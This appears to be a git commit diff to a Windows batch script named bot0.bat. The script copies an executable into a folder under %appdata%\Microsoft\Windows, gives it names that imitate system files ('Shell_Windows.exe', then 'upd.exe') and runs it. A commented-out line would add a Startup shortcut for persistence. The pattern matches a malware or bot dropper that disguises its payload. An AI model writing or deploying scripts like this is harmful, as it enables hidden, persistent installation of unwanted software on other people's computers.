4828ffef11224426902ea652954ed83067e38e39
DmodvGH <dmodv@vk.com>
2022-03-11 18:20:25 +0300

    ok bl

--- batniki/bot0.bat
+++ batniki/bot0.bat
@@ -1,7 +1,7 @@
 @ECHO off 
 cd %appdata%\Microsoft\Windows && mkdir pov
 cd %appdata%\Microsoft\Windows\pov && mkdir media && mkdir vers
-copy "C:\bot0\Shell_Windows.exe" "%appdata%\Microsoft\Windows\pov\Shell_Windows.exe"
+copy "C:\bot0\upd.exe" "%appdata%\Microsoft\Windows\pov\upd.exe"
 @REM copy "C:\bot0\Shell_Windows.lnk" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Shell_Windows.lnk"
-"%appdata%\Microsoft\Windows\pov\Shell_Windows.exe "
+"%appdata%\Microsoft\Windows\pov\upd.exe"
 pause
